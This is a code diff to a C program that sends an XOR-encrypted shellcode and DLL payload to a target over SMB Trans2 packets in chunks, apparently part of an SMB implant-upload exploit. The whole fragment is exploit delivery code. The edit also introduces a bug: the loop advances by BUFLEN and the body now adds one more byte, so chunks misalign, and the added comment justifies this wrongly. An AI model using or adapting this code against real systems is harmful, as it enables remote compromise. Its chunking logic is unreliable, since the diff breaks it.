@@ -260,10 +260,11 @@ int main(int argc, char* argv[])
 	//Copy the encrypted shellcode & DLL in 4096 byte chunks
 	//reads the response from the SMB response packet to determine if status is good or bad
 	int ctx;
+	int BUFLEN = 4064;
 	int encrypted_buffer_len;
 	encrypted_buffer_len = sizeof(encrypted);
 	int BytesToRead = sizeof(encrypted);
-	for (ctx = 0; ctx < encrypted_buffer_len; ctx += 4064)
+	for (ctx = 0; ctx < encrypted_buffer_len; ctx += BUFLEN)
 	{
 		memcpy(big_packet, trans2_request, sizeof(trans2_request));
 
@@ -286,7 +287,7 @@ int main(int argc, char* argv[])
 		
 		//fix me
 		//copy 4064 bytes at a time from the XOR encrypted buffer
-		memcpy(big_packet +  sizeof(trans2_request), (char*)encrypted+ctx, 4064);
+		memcpy(big_packet +  sizeof(trans2_request), (char*)encrypted+ctx, BUFLEN);
 
 		//FIX ME
 		//fix data len values
@@ -309,9 +310,8 @@ int main(int argc, char* argv[])
 		//subtract BytesToRead by how much we sent
 		numBytesToRead -= 4064;
 		
-		//fix me by incrementing the correct value
-		//4096-32 bytes in headers
-		ctx += 4064;
+		//increment CTX pointer by 1, so the correct bytes next loop will be copied
+		ctx++;
 	}
 
 	//command received successfully!
